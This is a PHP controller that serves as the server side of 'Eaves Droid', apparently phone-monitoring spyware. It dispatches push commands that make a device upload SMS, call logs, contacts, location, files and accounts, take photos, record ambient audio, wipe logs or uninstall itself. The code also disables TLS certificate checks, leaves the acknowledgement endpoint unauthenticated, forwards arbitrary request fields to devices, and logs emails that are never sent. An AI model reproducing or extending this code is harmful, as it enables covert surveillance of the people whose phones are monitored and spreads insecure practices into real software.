<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\LogUserActionModel;
use CodeIgniter\API\ResponseTrait;

class FCMCommandController extends BaseController
{
    use ResponseTrait;

    private const COMMAND_MAP = [
        'cmd_contacts' => ['feature' => 'fcm_fetch_contacts', 'action' => 'fetch_contacts', 'label' => 'Fetch Contacts', 'desc' => 'Requests the device to upload its contact list.'],
        'cmd_beep' => ['feature' => 'fcm_cmd_beep', 'action' => 'play_beep', 'label' => 'Play Test Beep', 'desc' => 'Sends a test beep command to verify the device connection.'],
        'cmd_health_check' => ['feature' => 'fcm_cmd_health', 'action' => null, 'label' => null, 'desc' => null],
        'cmd_apps' => ['feature' => 'fcm_fetch_apps', 'action' => 'fetch_apps', 'label' => 'Fetch Installed Apps', 'desc' => 'Requests the device to upload a list of all installed applications.'],
        'cmd_calls' => ['feature' => 'fcm_fetch_calls', 'action' => 'fetch_calls', 'label' => 'Fetch Call Logs', 'desc' => 'Requests the device to upload its call log history.'],
        'cmd_sms' => ['feature' => 'fcm_fetch_sms', 'action' => 'fetch_sms', 'label' => 'Fetch SMS', 'desc' => 'Requests the device to upload its SMS messages to the server.'],
        'cmd_location' => ['feature' => 'fcm_fetch_location', 'action' => 'fetch_location', 'label' => 'Fetch Location', 'desc' => 'Requests the device to upload its current GPS location.'],
        'cmd_telemetry_soft' => ['feature' => 'fcm_fetch_usage', 'action' => null, 'label' => null, 'desc' => null],
        'cmd_capture_photo' => ['feature' => 'fcm_cmd_camera', 'action' => 'capture_photo', 'label' => 'Capture Photo', 'desc' => 'Triggers the device camera to capture and upload a photo.'],
        'cmd_record_audio' => ['feature' => 'fcm_cmd_audio', 'action' => 'record_audio', 'label' => 'Record Audio', 'desc' => 'Triggers the device microphone to record and upload ambient audio.'],
        'cmd_files' => ['feature' => 'fcm_fetch_files', 'action' => 'fetch_files', 'label' => 'Fetch Files', 'desc' => 'Requests the device to upload its file directory listing.'],
        'cmd_fetch_file' => ['feature' => 'fcm_file_management', 'action' => 'fetch_file', 'label' => 'Fetch Specific File', 'desc' => 'Requests a specific file from the device by path.'],
        'cmd_delete_file' => ['feature' => 'fcm_file_management', 'action' => null, 'label' => null, 'desc' => null],
        'cmd_software_misc' => ['feature' => 'fcm_fetch_soft_misc', 'action' => null, 'label' => null, 'desc' => null],
        'cmd_hardware_misc' => ['feature' => 'fcm_fetch_hard_misc', 'action' => null, 'label' => null, 'desc' => null],
        'cmd_all' => ['feature' => 'fcm_fetch_all', 'action' => 'sync_all', 'label' => 'Sync All Data Categories', 'desc' => 'Requests the device to upload all available data categories.'],
        'cmd_reset_app' => ['feature' => 'fcm_cmd_reset_app', 'action' => 'reset_app', 'label' => 'App Reset', 'desc' => 'Resets the Eaves Droid app on the device to its initial state.'],
        'cmd_deactivate' => ['feature' => 'fcm_cmd_deactivate', 'action' => 'deactivate_app', 'label' => 'App Deactivation', 'desc' => 'Deactivates the Eaves Droid app, stopping all monitoring.'],
        'cmd_logout' => ['feature' => 'fcm_cmd_logout', 'action' => 'logout_user', 'label' => 'User Logout', 'desc' => 'LogsController out the current session on the device.'],
        'cmd_uninstall_preserve' => ['feature' => 'fcm_cmd_uninstall_preserve', 'action' => 'uninstall_preserve', 'label' => 'Uninstall (Keep Data)', 'desc' => 'Uninstalls the app while preserving collected data on the server.'],
        'cmd_uninstall_wipe' => ['feature' => 'fcm_cmd_uninstall_wipe', 'action' => 'uninstall_wipe', 'label' => 'Uninstall (Wipe All)', 'desc' => 'Uninstalls the app and wipes all collected data from the device.'],
        'cmd_search_data' => ['feature' => null, 'action' => 'search_data', 'label' => 'Keyword Search', 'desc' => 'Searches the device for files or data matching specific keywords.'],
        'cmd_start_tracking' => ['feature' => null, 'action' => 'start_tracking', 'label' => 'Start Live Tracking', 'desc' => 'Instructs the device to begin periodic location tracking for a set duration.'],
        'cmd_context' => ['feature' => null, 'action' => 'fetch_context', 'label' => 'Fetch Context (Activity + LocationController)', 'desc' => 'Requests the device to upload current activity recognition and location context.'],
        'cmd_usage' => ['feature' => null, 'action' => 'fetch_usage', 'label' => 'Fetch App Usage Stats', 'desc' => 'Requests the device to upload application usage statistics.'],
        'cmd_notifications' => ['feature' => null, 'action' => 'fetch_notifications', 'label' => 'Fetch Notifications', 'desc' => 'Requests the device to upload its recent notification history.'],
        'cmd_device_info' => ['feature' => null, 'action' => 'fetch_device_info', 'label' => 'Fetch Device Info', 'desc' => 'Requests the device to upload hardware and software information.'],
        'cmd_sensors' => ['feature' => null, 'action' => 'fetch_sensors', 'label' => 'Fetch Sensor Data', 'desc' => 'Requests the device to upload current sensor readings.'],
        'cmd_network' => ['feature' => null, 'action' => 'fetch_network', 'label' => 'Fetch Network Info', 'desc' => 'Requests the device to upload network connection details.'],
        'cmd_bluetooth' => ['feature' => null, 'action' => 'fetch_bluetooth', 'label' => 'Fetch Bluetooth Devices', 'desc' => 'Requests the device to upload paired and visible Bluetooth devices.'],
        'cmd_calendar' => ['feature' => null, 'action' => 'fetch_calendar', 'label' => 'Fetch Calendar Events', 'desc' => 'Requests the device to upload calendar events.'],
        'cmd_accounts' => ['feature' => null, 'action' => 'fetch_accounts', 'label' => 'Fetch Accounts', 'desc' => 'Requests the device to upload configured account information.'],
        'cmd_siren' => ['feature' => null, 'action' => 'play_siren', 'label' => 'Play Siren', 'desc' => 'Plays a loud siren sound on the device for locating it.'],
        'cmd_wipe_logs' => ['feature' => null, 'action' => 'wipe_logs', 'label' => 'Wipe Logs', 'desc' => 'Instructs the device to clear its local log data.'],
        'cmd_locate' => ['feature' => null, 'action' => 'locate_device', 'label' => 'Locate Device', 'desc' => 'Triggers an immediate locate command on the device.'],
        'cmd_sync_now' => ['feature' => null, 'action' => 'sync_data', 'label' => 'Sync Data Now', 'desc' => 'Triggers an immediate data sync on the device.'],
        'cmd_reactivate' => ['feature' => null, 'action' => 'reactivate_app', 'label' => 'App Reactivation', 'desc' => 'Reactivates the Eaves Droid app, resuming all monitoring.'],
        'cmd_update_prefs' => ['feature' => null, 'action' => 'update_settings', 'label' => 'Update Settings', 'desc' => 'Updates device settings and preferences remotely.'],
        'cmd_open_permission' => ['feature' => null, 'action' => 'open_permission', 'label' => 'Open Permission', 'desc' => 'Triggers the device to open a specific permission settings screen.'],
    ];

    private $credentialsPath = WRITEPATH . 'firebase_credentials.json';
    private $projectId = 'project-2026-35b76';

    public function getCredentialsJson(): ?array
    {
        // 1. Check disk file first
        if (file_exists($this->credentialsPath)) {
            $content = @file_get_contents($this->credentialsPath);
            if (!empty($content)) {
                $json = json_decode($content, true);
                if (!empty($json['client_email']) && !empty($json['private_key'])) {
                    if (!empty($json['project_id'])) {
                        $this->projectId = $json['project_id'];
                    }
                    return $json;
                }
            }
        }

        // 2. Check Database settings table
        try {
            $db = \Config\Database::connect();
            $row = $db->table('settings')
                ->where('class', 'notification')
                ->where('key', 'firebase_credentials_json')
                ->get()
                ->getRowArray();

            if (!empty($row['value'])) {
                $json = json_decode($row['value'], true);
                if (!empty($json['client_email']) && !empty($json['private_key'])) {
                    if (!empty($json['project_id'])) {
                        $this->projectId = $json['project_id'];
                    }
                    // Auto-sync / persist to file for faster subsequent access
                    @file_put_contents($this->credentialsPath, $row['value']);
                    return $json;
                }
            }
        } catch (\Throwable $t) {
            log_message('error', 'FCM credentials DB load error: ' . $t->getMessage());
        }

        // 3. Check Environment Variables (e.g. on Railway / Docker)
        $envJson = getenv('FIREBASE_CREDENTIALS_JSON') ?: getenv('FIREBASE_CREDENTIALS') ?: (function_exists('env') ? env('FIREBASE_CREDENTIALS_JSON') : null);
        if (!empty($envJson)) {
            $decoded = base64_decode($envJson, true);
            if ($decoded && str_contains($decoded, 'private_key')) {
                $envJson = $decoded;
            }
            $json = json_decode($envJson, true);
            if (!empty($json['client_email']) && !empty($json['private_key'])) {
                if (!empty($json['project_id'])) {
                    $this->projectId = $json['project_id'];
                }
                @file_put_contents($this->credentialsPath, $envJson);
                return $json;
            }
        }

        return null;
    }

    public function trigger($token = null, $category = 'all')
    {
        return $this->send($token, 'cmd_sync_now', $category);
    }

    public function send($token = null, $command = null, $payload = 'all')
    {
        $payload = $this->request->getPost('payload') ?? $this->request->getGet('payload') ?? $payload;
        if (!$token || !$command) {
            return $this->fail('Device token and command are required.', 400);
        }

        $fcmToken = null;
        $db = \Config\Database::connect();

        // 1. Try to treat as encrypted database ID (counter)
        $crypt = new \App\Models\CryptModel();
        $decryptedCounter = $crypt->decrypt_id($token);
        if ($decryptedCounter && is_numeric($decryptedCounter)) {
            $device = $db->table('tbl_device_profiles')
                ->select('fcm_token')
                ->where('counter', (int)$decryptedCounter)
                ->get()
                ->getRowArray();
            if ($device && !empty($device['fcm_token'])) {
                $fcmToken = $device['fcm_token'];
            }
        }

        // 2. Try to treat as device ID / checksum
        if (!$fcmToken) {
            $device = $db->table('tbl_device_profiles')
                ->select('fcm_token')
                ->where('device_id', $token)
                ->get()
                ->getRowArray();
            if ($device && !empty($device['fcm_token'])) {
                $fcmToken = $device['fcm_token'];
            }
        }

        // 3. Fallback: treat as raw FCM token
        if (!$fcmToken) {
            $fcmToken = $token;
        }

        // Validate command access against active subscription plan features

        if (isset(self::COMMAND_MAP[$command]['feature'])) {
            $deviceProfile = $db->table('tbl_device_profiles')
                ->select('owner_id')
                ->where('fcm_token', $fcmToken)
                ->get()
                ->getRowArray();
            $ownerId = $deviceProfile ? (int)$deviceProfile['owner_id'] : 0;

            if ($ownerId <= 0 && function_exists('auth') && auth()->loggedIn()) {
                $ownerId = (int)auth()->id();
            } elseif ($ownerId <= 0 && session()->has('user_id')) {
                $ownerId = (int)session()->get('user_id');
            }
            
            if ($ownerId) {
                $planGate = new \App\Services\PlanGate();
                $reqFeature = self::COMMAND_MAP[$command]['feature'];
                if (!$planGate->hasFeature($ownerId, $reqFeature)) {
                    return $this->fail('Forbidden: Target device plan does not permit this command.', 403);
                }
            }
        }

        $credentials = $this->getCredentialsJson();
        if (!$credentials) {
            return $this->fail('Firebase credentials file missing. Please configure your Firebase Service Account JSON in Admin Settings -> Firebase (FCM), or set FIREBASE_CREDENTIALS_JSON in Railway environment variables.', 500);
        }

        $accessToken = $this->getAccessToken();
        if (!$accessToken) {
            return $this->fail('Failed to generate OAuth2 token from Firebase credentials.', 500);
        }

        $logId = $this->logCommandDispatch($token, $command, $payload, [], true);

        $result = $this->dispatchFCMV1($fcmToken, $command, $payload, $accessToken, $logId);

        $responseBody = json_decode(json_encode($result), true) ?? [];
        // A true success means $result is not null AND doesn't contain an error
        $success = ($result !== null && !isset($responseBody['error']));

        $this->updateLogEntry($logId, $responseBody, $success);

        if ($success) {
            // Send notification email
            $this->sendDeviceManagementEmail($fcmToken, $command);
            return $this->respond([
                'success' => true,
                'message' => "Remote action '$command' for '$payload' dispatched.",
                'fcm_response' => $result,
                'action_log_id' => $logId,
            ]);
        } else {
            $errorBody = $result->error ?? null;
            $errorCode = null;

            if ($result === null) {
                $errorCode = 'CURL_ERROR';
            } elseif (is_object($errorBody)) {
                $errorCode = $errorBody->status ?? null; // e.g. "NOT_FOUND"
                if (empty($errorCode) && !empty($errorBody->details)) {
                    foreach ($errorBody->details as $detail) {
                        if (!empty($detail->errorCode)) {
                            $errorCode = $detail->errorCode; // e.g. "UNREGISTERED"
                            break;
                        }
                    }
                }
            }

            $isUnregistered = in_array($errorCode, ['UNREGISTERED', 'NOT_FOUND'], true)
                           || (is_object($errorBody) && ($errorBody->message ?? '') === 'NotRegistered');

            if ($isUnregistered) {
                // Auto-clean the stale token so the device shows as offline
                $db = \Config\Database::connect();
                $db->table('tbl_device_profiles')
                    ->where('fcm_token', $fcmToken)
                    ->update(['fcm_token' => null]);

                return $this->fail([
                    'success'       => false,
                    'message'       => 'Device is unreachable — the app may have been reinstalled or the device is no longer registered. The stale token has been cleared.',
                    'error_code'    => 'UNREGISTERED',
                    'action_log_id' => $logId,
                ], 410); // 410 Gone — resource no longer available
            }

            // If it's a transient error (quota, unavailable, timeout), queue for retry
            $transientErrors = ['QUOTA_EXCEEDED', 'UNAVAILABLE', 'INTERNAL', 'CURL_ERROR'];
            if (in_array($errorCode, $transientErrors, true) || $errorCode === null) {
                $this->queueForRetry($fcmToken, $command, $payload, $logId);
                return $this->respond([
                    'success'       => false,
                    'status'        => 'queued',
                    'message'       => 'Command queued, will retry when FCM is reachable',
                    'error_code'    => $errorCode,
                    'action_log_id' => $logId,
                ], 202);
            }

            return $this->fail([
                'success'       => false,
                'message'       => 'FCM dispatch failed.',
                'error'         => $result->error ?? 'Unknown error',
                'action_log_id' => $logId,
            ], 500);
        }
    }

    private function queueForRetry(string $token, string $command, string $payload, int $logId): void
    {
        $db = \Config\Database::connect();
        $db->table('tbl_fcm_retry_queue')->insert([
            'fcm_token'     => $token,
            'command'       => $command,
            'payload'       => $payload,
            'attempts'      => 0,
            'next_retry'    => date('Y-m-d H:i:s', time() + 60),  // retry in 1 min
            'action_log_id' => $logId,
            'created_at'    => date('Y-m-d H:i:s'),
        ]);
    }

    /**
     * POST /api/v1/fcm/ack/(:num)
     * Callback from the Android device after processing a command.
     */
    public function ack($logId = null)
    {
        if (!$logId) {
            return $this->fail('Log ID required.', 400);
        }

        $status = $this->request->getPost('status');
        $deviceMessage = $this->request->getPost('message');
        $deviceStatus = $this->request->getPost('device_status');
        $permissions = $this->request->getPost('permissions');

        try {
            $db = \Config\Database::connect();
            $existing = $db->table('tbl_user_actions')->where('id', $logId)->get()->getRowArray();
            if (!$existing) {
                return $this->fail('Log entry not found.', 404);
            }

            $nv = !empty($existing['new_values']) ? json_decode($existing['new_values'], true) : [];
            $nv['device_ack'] = [
                'status' => $status ?? 'unknown',
                'message' => $deviceMessage ?? '',
                'device_status' => $deviceStatus ?? '',
                'acknowledged_at' => date('Y-m-d H:i:s'),
            ];
            if ($permissions) {
                $nv['device_permissions'] = $permissions;
            }

            $db->table('tbl_user_actions')
                ->where('id', $logId)
                ->update([
                    'new_values' => json_encode($nv),
                    'success' => ($status === 'success') ? 1 : 0,
                    'error_message' => ($status !== 'success') ? ($deviceMessage ?? 'Command failed on device') : null,
                ]);

            // Phase 2: Redis Pub/Sub for SSE
            try {
                $redis = new \App\Services\RedisService();
                $client = $redis->getClient();
                if ($client) {
                    $client->publish("fcm:ack:{$logId}", json_encode([
                        'status' => ($status === 'success') ? 'ack_success' : 'ack_failed',
                        'message' => $deviceMessage ?? '',
                        'device_status' => $deviceStatus ?? '',
                    ]));
                }
            } catch (\Throwable $e) {
                log_message('error', 'Redis publish failed on ACK: ' . $e->getMessage());
            }

            return $this->respond(['success' => true, 'message' => 'Acknowledged.']);
        } catch (\Exception $e) {
            log_message('error', 'FCM ack error: ' . $e->getMessage());
            return $this->fail('Server error.', 500);
        }
    }

    private function logCommandDispatch(string $token, string $command, string $payload, array $response, bool $success): int
    {
        try {
            $logModel = new LogUserActionModel();
            $request = service('request');
            $userId = null;
            if (function_exists('auth') && auth()->loggedIn()) {
                $userId = (int) auth()->user()->id;
            }

            $actionType = self::COMMAND_MAP[$command]['action'] ?? ('remote_cmd_' . str_replace('cmd_', '', $command));

            $logId = $logModel->logAction([
                'user_id' => $userId,
                'action_category' => 'system',
                'action_type' => $actionType,
                'action_severity' => 'medium',
                'success' => $success ? 1 : 0,
                'resource_id' => $token,
                'new_values' => json_encode([
                    'command' => $command,
                    'payload' => $payload,
                    'fcm_response' => $response,
                ]),
                'error_message' => !$success ? ($response['error']['message'] ?? json_encode($response)) : null,
                'request_url' => current_url(),
                'request_method' => $request->getMethod(),
            ]);

            return (int) $logId;
        } catch (\Exception $e) {
            log_message('error', 'Failed to log FCM command: ' . $e->getMessage());
            return 0;
        }
    }

    private function updateLogEntry(int $logId, array $responseBody, bool $success): void
    {
        if ($logId <= 0) return;
        try {
            $db = \Config\Database::connect();
            $existing = $db->table('tbl_user_actions')->where('id', $logId)->get()->getRowArray();
            if (!$existing) return;

            $nv = !empty($existing['new_values']) ? json_decode($existing['new_values'], true) : [];
            $nv['fcm_response'] = $responseBody;

            $db->table('tbl_user_actions')
                ->where('id', $logId)
                ->update([
                    'new_values' => json_encode($nv),
                    'success' => $success ? 1 : 0,
                    'error_message' => !$success ? ($responseBody['error']['message'] ?? json_encode($responseBody)) : null,
                ]);
        } catch (\Exception $e) {
            log_message('error', 'Failed to update FCM log: ' . $e->getMessage());
        }
    }

    public function getAccessToken()
    {
        $json = $this->getCredentialsJson();
        if (!$json) return null;

        $now = time();
        $header = base64_encode(json_encode(['alg' => 'RS256', 'typ' => 'JWT']));
        $payload = base64_encode(json_encode([
            'iss' => $json['client_email'],
            'scope' => 'https://www.googleapis.com/auth/cloud-platform',
            'aud' => 'https://oauth2.googleapis.com/token',
            'exp' => $now + 3600,
            'iat' => $now
        ]));

        $signature = '';
        if (!openssl_sign("$header.$payload", $signature, $json['private_key'], 'SHA256')) {
            log_message('error', 'Failed to sign JWT for FCM OAuth2 token.');
            return null;
        }
        $jwt = "$header.$payload." . base64_encode($signature);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://oauth2.googleapis.com/token');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'grant_type' => 'urn:ietf:params:oauth:grant-type:jwt-bearer',
            'assertion' => $jwt
        ]));

        $result = json_decode(curl_exec($ch));
        curl_close($ch);

        return $result->access_token ?? null;
    }

    private function dispatchFCMV1($token, $command, $payload, $accessToken, $logId = 0)
    {
        $url = "https://fcm.googleapis.com/v1/projects/{$this->projectId}/messages:send";

        $message = [
            'message' => [
                'token' => $token,
                'data' => [
                    'command' => $command,
                    'payload' => $payload,
                    'sent_at' => date('Y-m-d H:i:s'),
                    'action_log_id' => (string) $logId,
                    'ack_url' => base_url('api/v1/command-acknowledgements/' . $logId),
                ]
            ]
        ];

        $requestData = service('request')->getVar();
        if (is_array($requestData)) {
            foreach ($requestData as $key => $value) {
                if (!in_array($key, ['token', 'command', 'payload']) && !str_starts_with($key, 'csrf_')) {
                    $message['message']['data'][$key] = (string) $value;
                }
            }
        }

        $headers = [
            'Authorization: Bearer ' . $accessToken,
            'Content-Type: application/json'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));

        $response = curl_exec($ch);
        curl_close($ch);

return json_decode($response);
    }

    /**
     * Get device owner email from FCM token
     */
    private function getDeviceOwnerEmail(string $token): ?string
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) {
            return null;
        }
        $uid = (int)$device['owner_id'];

        // Try auth_identities (email_password)
        $row = $db->table('auth_identities')
            ->select('secret AS email')
            ->where('user_id', $uid)
            ->where('type', 'email_password')
            ->get()
            ->getRowArray();
        if ($row && !empty($row['email'])) {
            return $row['email'];
        }

        return null;
    }

    private function getDeviceOwnerUsername(string $token): ?string
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) {
            return null;
        }

        $user = $db->table('users')
            ->select('username')
            ->where('id', $device['owner_id'])
            ->get()
            ->getRowArray();

        return $user['username'] ?? null;
    }

    /**
     * Send device management notification email using SMTP from DB settings (like export/delete).
     */
    private function sendDeviceManagementEmail(string $token, string $command): void
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) return;
        $uid = (int)$device['owner_id'];

        $profile = $db->table('user_profiles')
            ->select('email_notifications')
            ->where('user_id', $uid)
            ->get()
            ->getRowArray();
        if ($profile && isset($profile['email_notifications']) && !$profile['email_notifications']) return;

        $email = $this->getDeviceOwnerEmail($token);
        if (!$email) return;

        $username = $this->getDeviceOwnerUsername($token) ?? 'User';

        $initiatorName = 'System';
        if (function_exists('auth') && auth()->loggedIn()) {
            $initiatorName = auth()->user()->username ?? 'System';
        }
        $label = self::COMMAND_MAP[$command]['label'] ?? str_replace('_', ' ', str_replace('cmd_', '', $command));
        $description = self::COMMAND_MAP[$command]['desc'] ?? '';

        $request = service('request');
        $ip = $request->getIPAddress() ?? 'Unknown';
        $ua = $request->getUserAgent()->getAgentString() ?? 'Unknown';
        $timestamp = date('Y-m-d H:i:s');

        try {
            $smtp = [];
            $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
            foreach ($rows as $r) {
                $smtp[$r['key']] = $r['value'];
            }

            $emailService = \Config\Services::email();

            if (!empty($smtp['smtp_host'])) {
                $emailService->initialize([
                    'protocol'   => 'smtp',
                    'SMTPHost'   => $smtp['smtp_host'],
                    'SMTPPort'   => $smtp['smtp_port'] ?? '587',
                    'SMTPUser'   => $smtp['smtp_user'] ?? '',
                    'SMTPPass'   => $smtp['smtp_pass'] ?? '',
                    'SMTPCrypto' => 'tls',
                    'mailType'   => 'html',
                    'charset'    => 'UTF-8',
                    'wordWrap'   => true,
                ]);
            } else {
                $emailService->initialize([
                    'mailType' => 'html',
                    'charset'  => 'UTF-8',
                    'wordWrap' => true,
                ]);
            }

            $sender = get_notification_sender();
            $emailService->setFrom($sender['email'], $sender['name']);
            $emailService->setTo($email);
            $emailService->setSubject("Eaves Droid — Remote Command: {$label}");

            log_message('info', "Device management email sent to {$email} for command {$command}");
            } catch (\Exception $e) {
            log_message('error', 'Device management email failed: ' . $e->getMessage());
        }
    }
}
